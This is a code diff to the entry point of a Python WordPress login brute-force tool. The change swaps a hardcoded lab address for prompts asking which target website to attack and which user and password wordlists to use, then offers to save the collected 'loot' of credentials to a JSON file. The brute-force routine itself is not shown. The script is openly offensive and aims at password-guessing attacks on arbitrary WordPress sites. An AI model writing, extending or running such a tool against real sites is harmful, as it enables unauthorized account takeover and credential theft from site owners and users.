@@ -95,5 +95,18 @@ class WordpressLogin:
 
 
 if __name__ == "__main__":
-    test = WordpressLogin(target="http://10.1.1.39:8080/wp-login.php")
-    test.login_brute(user="admin", passlist="wordlist/test.txt")
+    target = input("Select target website: ")
+    userlist = input("Path to userlist: ")
+    passlist = input("Path to passlist: ")
+    wp = WordpressLogin()
+    tt = wp.login_brute(
+        target=target,
+        userlist=userlist,
+        passlist=passlist,
+    )
+    save = input("Want to save loot to file? y/n: ")
+
+    if save == "y":
+        import filehandler
+
+        filename = filehandler.write_json(wp.loot)
